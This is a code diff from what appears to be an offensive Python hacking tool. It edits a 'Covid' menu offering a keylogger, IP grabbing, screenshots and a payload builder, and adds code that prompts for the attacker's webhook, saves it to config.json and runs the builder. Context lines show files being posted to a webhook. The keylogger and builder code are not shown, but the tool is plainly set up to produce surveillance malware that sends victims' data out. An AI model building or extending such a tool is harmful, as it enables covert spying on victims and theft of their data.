@@ -34,6 +34,7 @@ from code.challange.pentestchallange import main
 from code.ipscanner import ip
 from code.letsenscript import domaine
 from code.robloxsearch import roblox
+from colorama import Fore
 
 red = "\033[31m"
 green = "\033[32m"
@@ -778,7 +779,7 @@ while True:
             ╚██████╗╚██████╔╝ ╚████╔╝ ██║██████╔╝     ██║ █████╔╝
              ╚═════╝ ╚═════╝   ╚═══╝  ╚═╝╚═════╝      ╚═╝ ╚════╝ 
             
-            1. [KeyLogger]  4. [Build Covid (Go place Your Webhook in files)]
+            1. [KeyLogger]  4. [Build Covid]
             2. [Grabing IP] 5. [Quit]
             3. [ScreenShot]
 
@@ -900,6 +901,20 @@ while True:
                 "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"
                 }, files=files)
         elif covid == "4":
+            try:
+                webhook = input(f"""{Fore.MAGENTA}
+                                                                                
+                ██  ██ ██ █████▄  ██  ██ ▄█████   █████▄ ██  ██ ██ ██     ████▄  
+                ██▄▄██ ██ ██▄▄██▄ ██  ██ ▀▀▀▄▄▄   ██▄▄██ ██  ██ ██ ██     ██  ██ 
+                 ▀██▀  ██ ██   ██ ▀████▀ █████▀   ██▄▄█▀ ▀████▀ ██ ██████ ████▀  
+                
+                Met Ton Webhook : """)
+            except ValueError as e:
+                print(f"Error {e}")
+
+            with open("config.json", "w", encoding="utf-8") as f:
+                json.dump({"webhook": webhook}, f, ensure_ascii=False, indent=4)
+                
             builder()
 
         elif covid == "5":
